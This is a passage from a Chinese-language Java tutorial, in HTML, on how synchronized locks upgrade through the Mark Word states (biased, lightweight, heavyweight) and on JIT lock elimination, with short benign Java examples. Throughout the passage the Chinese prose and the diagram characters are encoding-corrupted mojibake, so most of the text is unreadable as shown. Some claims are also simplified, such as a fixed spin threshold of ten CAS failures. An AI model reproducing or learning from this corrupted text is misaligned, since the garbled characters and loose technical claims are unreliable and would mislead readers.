<p>Mark Wordæ˜¯å¯¹è±¡å¤´çš„ä¸€éƒ¨åˆ†ï¼Œç”¨äºå­˜å‚¨å¯¹è±¡è‡ªèº«çš„è¿è¡Œæ—¶æ•°æ®ï¼ŒåŒ…æ‹¬ï¼š</p>
<ul>
<li>å¯¹è±¡çš„å“ˆå¸Œç ï¼ˆhashCodeï¼‰</li>
<li>å¯¹è±¡çš„åˆ†ä»£å¹´é¾„ï¼ˆç”¨äºGCï¼‰</li>
<li><strong>é”çš„æ ‡å¿—ä½ï¼ˆæœ€é‡è¦çš„ï¼‰</strong></li>
</ul>
<p><strong>Mark Wordåœ¨ä¸åŒé”çŠ¶æ€ä¸‹å­˜å‚¨çš„å†…å®¹ï¼š</strong></p>
<p><strong>64ä½JVMçš„Mark Wordç»“æ„ï¼ˆç®€åŒ–ç†è§£ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">Mark</span> Word (<span class="hljs-number">64</span>ä½)
â”œâ”€â”€ é”çŠ¶æ€ï¼ˆ<span class="hljs-number">2</span>ä½ï¼‰ï¼šæ ‡è¯†å½“å‰é”çš„ç±»å‹
â””â”€â”€ å…¶ä»–æ•°æ®ï¼ˆ<span class="hljs-number">62</span>ä½ï¼‰ï¼šæ ¹æ®é”çŠ¶æ€ä¸åŒï¼Œå­˜å‚¨ä¸åŒå†…å®¹

é”çŠ¶æ€åˆ†ç±»ï¼š
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ é”çŠ¶æ€   â”‚ <span class="hljs-selector-tag">Mark</span> Wordå†…å®¹                        â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ æ— é”     â”‚ å¯¹è±¡çš„hashCode + åˆ†ä»£å¹´é¾„ + çŠ¶æ€ä½<span class="hljs-number">01</span>  â”‚
â”‚ åå‘é”   â”‚ çº¿ç¨‹ID + Epoch + åˆ†ä»£å¹´é¾„ + çŠ¶æ€ä½<span class="hljs-number">01</span>  â”‚
â”‚ è½»é‡çº§é” â”‚ æŒ‡å‘æ ˆä¸­é”è®°å½•çš„æŒ‡é’ˆ + çŠ¶æ€ä½<span class="hljs-number">00</span>        â”‚
â”‚ é‡é‡çº§é” â”‚ æŒ‡å‘monitorå¯¹è±¡çš„æŒ‡é’ˆ + çŠ¶æ€ä½<span class="hljs-number">10</span>       â”‚
â”‚ GCæ ‡è®°   â”‚ ç©º + çŠ¶æ€ä½<span class="hljs-number">11</span>                        â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p><strong>ç®€å•ç†è§£ï¼š</strong></p>
<ul>
<li><strong>æ— é”</strong>ï¼šæ­£å¸¸å¯¹è±¡ï¼Œæ²¡æœ‰çº¿ç¨‹ç«äº‰</li>
<li><strong>åå‘é”</strong>ï¼šåªæœ‰ä¸€ä¸ªçº¿ç¨‹ä½¿ç”¨ï¼Œè®°å½•çº¿ç¨‹ID</li>
<li><strong>è½»é‡çº§é”</strong>ï¼šæœ‰ç«äº‰ä½†ä¸æ¿€çƒˆï¼Œä½¿ç”¨CASå’Œè‡ªæ—‹</li>
<li><strong>é‡é‡çº§é”</strong>ï¼šç«äº‰æ¿€çƒˆï¼Œä½¿ç”¨æ“ä½œç³»ç»Ÿçº§åˆ«çš„é”</li>
</ul>
<h4 data-id="heading-63">é”çš„å‡çº§è¿‡ç¨‹</h4>
<p><strong>é”å‡çº§çš„ç›®çš„ï¼š</strong> æ ¹æ®ç«äº‰æƒ…å†µåŠ¨æ€è°ƒæ•´é”ç­–ç•¥ï¼Œåœ¨ä¿è¯çº¿ç¨‹å®‰å…¨çš„å‰æä¸‹ï¼Œå°½å¯èƒ½æé«˜æ€§èƒ½ã€‚</p>
<p><strong>å‡çº§è·¯å¾„ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">æ— é” â†’ åå‘é” â†’ è½»é‡çº§é” â†’ é‡é‡çº§é”
<span class="hljs-code">      ï¼ˆå•å‘å‡çº§ï¼Œä¸èƒ½é™çº§ï¼‰
</span></code></pre>
<h5 data-id="heading-64">æ— é”çŠ¶æ€</h5>
<p><strong>ç‰¹ç‚¹ï¼š</strong> å¯¹è±¡åˆšåˆ›å»ºæ—¶ï¼Œæ²¡æœ‰ä»»ä½•çº¿ç¨‹ä½¿ç”¨ï¼Œå¤„äºæ— é”çŠ¶æ€</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
<span class="hljs-comment">// æ­¤æ—¶objçš„Mark Wordå¤„äºæ— é”çŠ¶æ€</span>
<span class="hljs-comment">// é”æ ‡å¿—ä½ï¼š01ï¼Œæ²¡æœ‰åå‘ä½</span>
</code></pre>
<p><strong>ä½¿ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>å¯¹è±¡åˆšåˆ›å»º</li>
<li>æ²¡æœ‰çº¿ç¨‹è®¿é—®åŒæ­¥ä»£ç å—</li>
<li>æ­£å¸¸çš„å¯¹è±¡çŠ¶æ€</li>
</ul>
<h5 data-id="heading-65">åå‘é”ï¼ˆBiased Lockingï¼‰</h5>
<p><strong>è®¾è®¡ç›®çš„ï¼š</strong> ä¼˜åŒ–å•çº¿ç¨‹é‡å¤è·å–é”çš„åœºæ™¯</p>
<p><strong>é€‚ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œåªæœ‰ä¸€ä¸ªçº¿ç¨‹ä½¿ç”¨é”</li>
<li>åŒä¸€ä¸ªçº¿ç¨‹å¤šæ¬¡è·å–åŒä¸€ä¸ªé”</li>
<li>æ²¡æœ‰çœŸæ­£çš„ç«äº‰</li>
</ul>
<p><strong>å·¥ä½œåŸç†ï¼ˆç®€å•ç†è§£ï¼‰ï¼š</strong></p>
<p><strong>ç¬¬ä¸€æ¬¡è·å–é”ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> çº¿ç¨‹1ç¬¬ä¸€æ¬¡è¿›å…¥synchronizedå—
<span class="hljs-bullet">2.</span> æ£€æŸ¥Mark Wordï¼šæ˜¯å¦ä¸ºå¯åå‘çŠ¶æ€ï¼Ÿ
<span class="hljs-bullet">3.</span> æ˜¯ï¼šåœ¨Mark Wordä¸­è®°å½•çº¿ç¨‹1çš„ID
<span class="hljs-bullet">4.</span> å°†é”çŠ¶æ€è®¾ç½®ä¸ºåå‘é”
<span class="hljs-bullet">5.</span> ä¹‹åçº¿ç¨‹1å†è¿›å…¥æ—¶ï¼Œç›´æ¥æ£€æŸ¥çº¿ç¨‹IDï¼Œç›¸åŒå°±ç›´æ¥æ‰§è¡Œ
</code></pre>
<p><strong>å†æ¬¡è·å–é”ï¼ˆåŒä¸€çº¿ç¨‹ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> çº¿ç¨‹1å†æ¬¡è¿›å…¥synchronizedå—
<span class="hljs-bullet">2.</span> æ£€æŸ¥Mark Wordä¸­çš„çº¿ç¨‹IDï¼šæ˜¯å¦æ˜¯è‡ªå·±ï¼Ÿ
<span class="hljs-bullet">3.</span> æ˜¯ï¼šç›´æ¥æ‰§è¡Œï¼Œæ— éœ€ä»»ä½•åŒæ­¥æ“ä½œï¼ˆå¾ˆå¿«ï¼ï¼‰
<span class="hljs-bullet">4.</span> å°±åƒ"å…æ£€é€šé“"ï¼Œæ— éœ€æ’é˜Ÿ
</code></pre>
<p><strong>ä»£ç ç¤ºä¾‹ï¼ˆç®€åŒ–ç†è§£ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Counter</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// ç¬¬ä¸€æ¬¡ï¼šå‡çº§ä¸ºåå‘é”ï¼Œè®°å½•çº¿ç¨‹ID</span>
        <span class="hljs-comment">// ä¹‹ååŒä¸€çº¿ç¨‹ï¼šç›´æ¥æ‰§è¡Œï¼Œå‡ ä¹æ— å¼€é”€</span>
    }
}

<span class="hljs-comment">// åœºæ™¯ï¼šå•çº¿ç¨‹åœºæ™¯</span>
<span class="hljs-type">Counter</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Counter</span>();
<span class="hljs-comment">// çº¿ç¨‹Aå¤šæ¬¡è°ƒç”¨ï¼Œéƒ½å¾ˆå¿«ï¼ˆåå‘é”ä¼˜åŒ–ï¼‰</span>
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
    c.increment();  <span class="hljs-comment">// ç¬¬äºŒæ¬¡å¼€å§‹å°±å¾ˆå¿«äº†</span>
}
</code></pre>
<p><strong>åå‘é”çš„ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>âœ… <strong>æ€§èƒ½æå¥½</strong>ï¼šåŒä¸€çº¿ç¨‹å†æ¬¡è·å–é”å‡ ä¹æ— å¼€é”€</li>
<li>âœ… <strong>é€‚åˆå•çº¿ç¨‹åœºæ™¯</strong>ï¼šå¤§å¤šæ•°æƒ…å†µä¸‹å°±æ˜¯å•çº¿ç¨‹ä½¿ç”¨</li>
<li>âœ… <strong>å‡å°‘åŒæ­¥å¼€é”€</strong>ï¼šé¿å…CASæ“ä½œ</li>
</ul>
<p><strong>åå‘é”çš„è·å–æµç¨‹ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> æ£€æŸ¥Mark Wordçš„é”æ ‡å¿—ä½ï¼ˆæ˜¯å¦ä¸º01ï¼Œå¯åå‘ï¼‰
   â”œâ”€ æ˜¯ â†’ ç»§ç»­
   â””â”€ å¦ â†’ å·²æœ‰å…¶ä»–é”çŠ¶æ€ï¼Œè·³è¿‡åå‘é”

<span class="hljs-bullet">2.</span> æ£€æŸ¥çº¿ç¨‹IDæ˜¯å¦æŒ‡å‘å½“å‰çº¿ç¨‹
   â”œâ”€ æ˜¯ â†’ ç›´æ¥è¿›å…¥åŒæ­¥ä»£ç å—ï¼ˆæœ€å¿«è·¯å¾„ï¼‰
   â””â”€ å¦ â†’ å°è¯•CASæ›¿æ¢çº¿ç¨‹ID
<span class="hljs-code">       â”œâ”€ æˆåŠŸ â†’ è·å¾—åå‘é”
       â””â”€ å¤±è´¥ â†’ æ’¤é”€åå‘é”ï¼Œå‡çº§ä¸ºè½»é‡çº§é”
</span></code></pre>
<h5 data-id="heading-66">è½»é‡çº§é”ï¼ˆLightweight Lockingï¼‰</h5>
<p><strong>è®¾è®¡ç›®çš„ï¼š</strong> å½“æœ‰å¤šä¸ªçº¿ç¨‹ç«äº‰ï¼Œä½†ç«äº‰ä¸æ¿€çƒˆæ—¶ï¼Œä½¿ç”¨CASè‡ªæ—‹ä»£æ›¿é˜»å¡</p>
<p><strong>é€‚ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>æœ‰å¤šä¸ªçº¿ç¨‹ç«äº‰é”</li>
<li>ä½†ç«äº‰ä¸æ¿€çƒˆï¼ˆå¤§éƒ¨åˆ†CASèƒ½æˆåŠŸï¼‰</li>
<li>ç­‰å¾…æ—¶é—´çŸ­</li>
</ul>
<p><strong>å·¥ä½œåŸç†ï¼ˆç®€åŒ–ç†è§£ï¼‰ï¼š</strong></p>
<p><strong>è·å–é”çš„è¿‡ç¨‹ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> åœ¨æ ˆä¸­åˆ›å»ºé”è®°å½•ï¼ˆLock Recordï¼‰
<span class="hljs-bullet">2.</span> å¤åˆ¶å¯¹è±¡å¤´çš„Mark Wordåˆ°é”è®°å½•ï¼ˆå¤‡ä»½ï¼‰
<span class="hljs-bullet">3.</span> CASå°è¯•å°†å¯¹è±¡å¤´çš„Mark Wordæ›¿æ¢ä¸ºé”è®°å½•çš„æŒ‡é’ˆ
   â”œâ”€ æˆåŠŸ â†’ è·å¾—è½»é‡çº§é”ï¼ˆå¾ˆå¿«ï¼Œä½¿ç”¨CASï¼‰
   â””â”€ å¤±è´¥ â†’ æœ‰å…¶ä»–çº¿ç¨‹åœ¨ç«äº‰ï¼Œè‡ªæ—‹é‡è¯•
<span class="hljs-code">       â”œâ”€ è‡ªæ—‹æˆåŠŸ â†’ è·å¾—é”
       â””â”€ è‡ªæ—‹å¤±è´¥ï¼ˆè‡ªæ—‹æ¬¡æ•°è¿‡å¤šï¼‰â†’ å‡çº§ä¸ºé‡é‡çº§é”
</span></code></pre>
<p><strong>ä¸ºä»€ä¹ˆå«"è½»é‡çº§"ï¼Ÿ</strong></p>
<ul>
<li>ä¸éœ€è¦æ“ä½œç³»ç»Ÿä»‹å…¥ï¼ˆé‡é‡çº§é”éœ€è¦ï¼‰</li>
<li>ä½¿ç”¨CASè‡ªæ—‹ï¼Œçº¿ç¨‹ä¸é˜»å¡</li>
<li>å¼€é”€æ¯”é‡é‡çº§é”å°</li>
</ul>
<p><strong>ä»£ç ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Counter</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// å¤šçº¿ç¨‹ç«äº‰ï¼Œä½†ç«äº‰ä¸æ¿€çƒˆ</span>
        <span class="hljs-comment">// ä½¿ç”¨è½»é‡çº§é”ï¼šCAS + è‡ªæ—‹</span>
        count++;
    }
}

<span class="hljs-comment">// åœºæ™¯ï¼šå¤šä¸ªçº¿ç¨‹ï¼Œä½†ç«äº‰ä¸æ¿€çƒˆ</span>
<span class="hljs-type">Counter</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Counter</span>();
<span class="hljs-comment">// å¤šä¸ªçº¿ç¨‹åŒæ—¶è°ƒç”¨ï¼Œä½†å¤§å¤šæ•°æƒ…å†µä¸‹CASèƒ½æˆåŠŸ</span>
<span class="hljs-comment">// åªæœ‰å°‘æ•°æƒ…å†µéœ€è¦è‡ªæ—‹é‡è¯•</span>
</code></pre>
<p><strong>è½»é‡çº§é”çš„ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>âœ… <strong>ä½¿ç”¨CAS</strong>ï¼šæ— é”ç¼–ç¨‹æ€æƒ³ï¼Œæ€§èƒ½å¥½</li>
<li>âœ… <strong>è‡ªæ—‹é‡è¯•</strong>ï¼šå¤±è´¥åè‡ªæ—‹å‡ æ¬¡ï¼Œé¿å…ç«‹å³é˜»å¡</li>
<li>âš ï¸ <strong>CPUæ¶ˆè€—</strong>ï¼šè‡ªæ—‹ä¼šå ç”¨CPUï¼Œä¸é€‚åˆé«˜ç«äº‰åœºæ™¯</li>
<li>âš ï¸ <strong>å¯èƒ½å‡çº§</strong>ï¼šè‡ªæ—‹å¤±è´¥åå‡çº§ä¸ºé‡é‡çº§é”</li>
</ul>
<h5 data-id="heading-67">é‡é‡çº§é”ï¼ˆHeavyweight Lockingï¼‰</h5>
<p><strong>è®¾è®¡ç›®çš„ï¼š</strong> å½“ç«äº‰æ¿€çƒˆæ—¶ï¼Œä½¿ç”¨æ“ä½œç³»ç»Ÿçº§åˆ«çš„äº’æ–¥é‡ï¼Œè®©çº¿ç¨‹é˜»å¡ç­‰å¾…</p>
<p><strong>é€‚ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>é”ç«äº‰æ¿€çƒˆï¼ˆå¾ˆå¤šçº¿ç¨‹åŒæ—¶ç«äº‰ï¼‰</li>
<li>è½»é‡çº§é”è‡ªæ—‹å¤±è´¥ï¼ˆè‡ªæ—‹æ¬¡æ•°è¶…è¿‡é˜ˆå€¼ï¼‰</li>
<li>ç­‰å¾…æ—¶é—´å¯èƒ½å¾ˆé•¿</li>
</ul>
<p><strong>å·¥ä½œåŸç†ï¼ˆç®€åŒ–ç†è§£ï¼‰ï¼š</strong></p>
<p><strong>å‡çº§è¿‡ç¨‹ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> è½»é‡çº§é”è‡ªæ—‹å¤±è´¥ï¼ˆå¤šæ¬¡CASå¤±è´¥ï¼‰
<span class="hljs-bullet">2.</span> é”å‡çº§ä¸ºé‡é‡çº§é”
<span class="hljs-bullet">3.</span> å¯¹è±¡å¤´çš„Mark WordæŒ‡å‘monitorå¯¹è±¡ï¼ˆç®¡ç¨‹ï¼‰
<span class="hljs-bullet">4.</span> ç«äº‰å¤±è´¥çš„çº¿ç¨‹è¿›å…¥é˜»å¡é˜Ÿåˆ—
<span class="hljs-bullet">5.</span> ç”±æ“ä½œç³»ç»Ÿè¿›è¡Œçº¿ç¨‹è°ƒåº¦å’Œå”¤é†’
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆå«"é‡é‡çº§"ï¼Ÿ</strong></p>
<ul>
<li>éœ€è¦æ“ä½œç³»ç»Ÿä»‹å…¥ï¼ˆæ“ä½œç³»ç»Ÿçº§åˆ«çš„mutexï¼‰</li>
<li>çº¿ç¨‹ä¼šé˜»å¡ï¼Œéœ€è¦ä¸Šä¸‹æ–‡åˆ‡æ¢</li>
<li>å¼€é”€æ¯”è½»é‡çº§é”å¤§</li>
</ul>
<p><strong>ä»£ç ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Counter</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// å¾ˆå¤šçº¿ç¨‹åŒæ—¶ç«äº‰</span>
        <span class="hljs-comment">// ä½¿ç”¨é‡é‡çº§é”ï¼šçº¿ç¨‹é˜»å¡ç­‰å¾…</span>
        count++;
    }
}

<span class="hljs-comment">// åœºæ™¯ï¼šé«˜ç«äº‰</span>
<span class="hljs-type">Counter</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Counter</span>();
<span class="hljs-comment">// 100ä¸ªçº¿ç¨‹åŒæ—¶ç«äº‰ï¼Œè½»é‡çº§é”è‡ªæ—‹å¤±è´¥</span>
<span class="hljs-comment">// å‡çº§ä¸ºé‡é‡çº§é”ï¼Œå¤§éƒ¨åˆ†çº¿ç¨‹é˜»å¡ç­‰å¾…</span>
</code></pre>
<p><strong>é‡é‡çº§é”çš„ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>âœ… <strong>é€‚åˆé«˜ç«äº‰</strong>ï¼šç«äº‰æ¿€çƒˆæ—¶æ€§èƒ½ç¨³å®š</li>
<li>âœ… <strong>èŠ‚çœCPU</strong>ï¼šé˜»å¡çš„çº¿ç¨‹ä¸å ç”¨CPU</li>
<li>âŒ <strong>å¼€é”€å¤§</strong>ï¼šéœ€è¦æ“ä½œç³»ç»Ÿä»‹å…¥ï¼Œä¸Šä¸‹æ–‡åˆ‡æ¢å¼€é”€</li>
<li>âŒ <strong>å“åº”æ…¢</strong>ï¼šçº¿ç¨‹é˜»å¡åéœ€è¦ç­‰å¾…è¢«å”¤é†’</li>
</ul>
<h4 data-id="heading-68">é”å‡çº§çš„æ¡ä»¶å’Œæ—¶æœº</h4>
<p><strong>å‡çº§è·¯å¾„ï¼ˆå•å‘ï¼Œä¸èƒ½é™çº§ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">æ— é” â†’ åå‘é” â†’ è½»é‡çº§é” â†’ é‡é‡çº§é”
<span class="hljs-code">      ï¼ˆä¸€æ—¦å‡çº§ï¼Œä¸èƒ½é™çº§ï¼‰
</span></code></pre>
<p><strong>å‡çº§æ¡ä»¶è¯¦è§£ï¼š</strong></p>
<h5 data-id="heading-69">1. æ— é” â†’ åå‘é”</h5>
<p><strong>è§¦å‘æ¡ä»¶ï¼š</strong></p>
<ul>
<li>å¯¹è±¡è¢«ç¬¬ä¸€ä¸ªçº¿ç¨‹è®¿é—®åŒæ­¥ä»£ç å—</li>
<li>JVMå¯ç”¨åå‘é”ï¼ˆJDK 15+é»˜è®¤ç¦ç”¨ï¼Œä½†äº†è§£åŸç†å¾ˆé‡è¦ï¼‰</li>
</ul>
<p><strong>æ—¶æœºï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// æ— é”çŠ¶æ€</span>

<span class="hljs-comment">// ç¬¬ä¸€æ¬¡è®¿é—®</span>
<span class="hljs-keyword">synchronized</span>(obj) {
    <span class="hljs-comment">// å‡çº§ä¸ºåå‘é”ï¼Œè®°å½•å½“å‰çº¿ç¨‹ID</span>
}
</code></pre>
<h5 data-id="heading-70">2. åå‘é” â†’ è½»é‡çº§é”</h5>
<p><strong>è§¦å‘æ¡ä»¶ï¼š</strong></p>
<ul>
<li>æœ‰å…¶ä»–çº¿ç¨‹å°è¯•è·å–åå‘é”ï¼ˆå‘ç°çº¿ç¨‹IDä¸æ˜¯è‡ªå·±ï¼‰</li>
<li>åå‘é”æ’¤é”€ï¼Œå‡çº§ä¸ºè½»é‡çº§é”</li>
</ul>
<p><strong>æ—¶æœºï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// çº¿ç¨‹1è·å¾—åå‘é”</span>
<span class="hljs-keyword">synchronized</span>(obj) {
    <span class="hljs-comment">// åå‘é”çŠ¶æ€</span>
}

<span class="hljs-comment">// çº¿ç¨‹2å°è¯•è·å–é”ï¼ˆå‘ç°çº¿ç¨‹IDä¸æ˜¯è‡ªå·±ï¼‰</span>
<span class="hljs-comment">// è§¦å‘åå‘é”æ’¤é”€ï¼Œå‡çº§ä¸ºè½»é‡çº§é”</span>
<span class="hljs-keyword">synchronized</span>(obj) {
    <span class="hljs-comment">// è½»é‡çº§é”çŠ¶æ€ï¼Œä½¿ç”¨CASç«äº‰</span>
}
</code></pre>
<h5 data-id="heading-71">3. è½»é‡çº§é” â†’ é‡é‡çº§é”</h5>
<p><strong>è§¦å‘æ¡ä»¶ï¼š</strong></p>
<ul>
<li>è‡ªæ—‹å¤±è´¥ï¼ˆCASå¤±è´¥æ¬¡æ•°è¶…è¿‡é˜ˆå€¼ï¼Œå¦‚10æ¬¡ï¼‰</li>
<li>ç­‰å¾…çš„çº¿ç¨‹æ•°è¶…è¿‡1ä¸ª</li>
<li>è‡ªæ—‹æ—¶é—´è¿‡é•¿</li>
</ul>
<p><strong>æ—¶æœºï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å¤šä¸ªçº¿ç¨‹ç«äº‰ï¼ŒCASé¢‘ç¹å¤±è´¥</span>
<span class="hljs-comment">// è‡ªæ—‹å¤šæ¬¡åä»ç„¶å¤±è´¥</span>
<span class="hljs-keyword">synchronized</span>(obj) {
    <span class="hljs-comment">// å‡çº§ä¸ºé‡é‡çº§é”</span>
    <span class="hljs-comment">// å¤±è´¥çš„çº¿ç¨‹è¿›å…¥é˜»å¡é˜Ÿåˆ—</span>
}
</code></pre>
<p><strong>å‡çº§å†³ç­–æµç¨‹ï¼ˆç®€åŒ–ç†è§£ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">çº¿ç¨‹å°è¯•è·å–é”
  â†“
æ˜¯å¦æœ‰ç«äº‰ï¼Ÿ
  â”œâ”€ æ—  â†’ åå‘é”ï¼ˆè®°å½•çº¿ç¨‹IDï¼‰
  â””â”€ æœ‰ â†’ è½»é‡çº§é”ï¼ˆCAS + è‡ªæ—‹ï¼‰
<span class="hljs-code">       â†“
     è‡ªæ—‹æ˜¯å¦æˆåŠŸï¼Ÿ
       â”œâ”€ æˆåŠŸ â†’ ä¿æŒè½»é‡çº§é”
       â””â”€ å¤±è´¥ï¼ˆè¶…è¿‡é˜ˆå€¼ï¼‰â†’ é‡é‡çº§é”ï¼ˆé˜»å¡ç­‰å¾…ï¼‰
</span></code></pre>
<p><strong>æŸ¥çœ‹é”çŠ¶æ€ï¼ˆäº†è§£å³å¯ï¼‰ï¼š</strong></p>
<p>å¯ä»¥ä½¿ç”¨JOLï¼ˆJava Object Layoutï¼‰å·¥å…·æŸ¥çœ‹å¯¹è±¡å¤´çš„é”çŠ¶æ€ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// éœ€è¦æ·»åŠ ä¾èµ–ï¼šorg.openjdk.jol:jol-core</span>
<span class="hljs-keyword">import</span> org.openjdk.jol.info.ClassLayout;

<span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
System.out.println(ClassLayout.parseInstance(obj).toPrintable());
<span class="hljs-comment">// å¯ä»¥çœ‹åˆ°Mark Wordçš„è¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬é”çŠ¶æ€</span>
</code></pre>
<h3 data-id="heading-72">3.3 synchronizedçš„ä¼˜åŒ–</h3>
<p><strong>JVMä¼šå¯¹synchronizedè¿›è¡Œå¤šç§ä¼˜åŒ–ï¼Œæé«˜æ€§èƒ½ã€‚</strong></p>
<h4 data-id="heading-73">é”æ¶ˆé™¤ï¼ˆLock Eliminationï¼‰</h4>
<p><strong>åŸç†ï¼š</strong> JVMåœ¨JITç¼–è¯‘æ—¶ï¼Œåˆ†æä»£ç åå‘ç°æŸä¸ªé”æ²¡æœ‰å¿…è¦ï¼Œå°±è‡ªåŠ¨æ¶ˆé™¤å®ƒã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆä¼šæ¶ˆé™¤ï¼Ÿ</strong></p>
<ul>
<li>å¦‚æœå¯¹è±¡ä¸ä¼š"é€ƒé€¸"å‡ºæ–¹æ³•ï¼ˆå…¶ä»–çº¿ç¨‹è®¿é—®ä¸åˆ°ï¼‰</li>
<li>å°±æ²¡æœ‰å¤šçº¿ç¨‹ç«äº‰ï¼Œé”å°±æ²¡æœ‰å¿…è¦</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// StringBufferæ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼ˆå†…éƒ¨æœ‰synchronizedï¼‰</span>
<span class="hljs-keyword">public</span> String <span class="hljs-title function_">concatString</span><span class="hljs-params">(String s1, String s2, String s3)</span> {
    <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();  <span class="hljs-comment">// å±€éƒ¨å˜é‡ï¼Œä¸ä¼šé€ƒé€¸</span>
    sb.append(s1);  <span class="hljs-comment">// è¿™äº›æ“ä½œè™½ç„¶æœ‰é”ï¼Œä½†JVMä¼šæ¶ˆé™¤</span>
    sb.append(s2);
    sb.append(s3);
    <span class="hljs-keyword">return</span> sb.toString();
}

<span class="hljs-comment">// JVMåˆ†æåå‘ç°ï¼šsbæ˜¯å±€éƒ¨å˜é‡ï¼Œå…¶ä»–çº¿ç¨‹è®¿é—®ä¸åˆ°</span>
<span class="hljs-comment">// ä¼˜åŒ–ï¼šæ¶ˆé™¤StringBufferå†…éƒ¨çš„é”ï¼Œç›´æ¥æ“ä½œï¼ˆæ›´å¿«ï¼‰</span>
</code></pre>
<p><strong>è§¦å‘æ¡ä»¶ï¼š</strong></p>
<ul>
<li>âœ… å¯¹è±¡æ˜¯å±€éƒ¨å˜é‡ï¼Œä¸ä¼šé€ƒé€¸å‡ºæ–¹æ³•</li>
<li>âœ… æ²¡æœ‰å…¶ä»–çº¿ç¨‹èƒ½è®¿é—®åˆ°è¿™ä¸ªå¯¹è±¡</li>
<li>âœ… JVMåœ¨JITç¼–è¯‘æ—¶æ£€æµ‹åˆ°</li>
</ul>
<p><strong>æ•ˆæœï¼š</strong> æ¶ˆé™¤ä¸å¿…è¦çš„é”å¼€é”€ï¼Œæé«˜æ€§èƒ½</p>
<h4 data-id="heading-74">é”ç²—åŒ–ï¼ˆLock Coarseningï¼‰</h4>
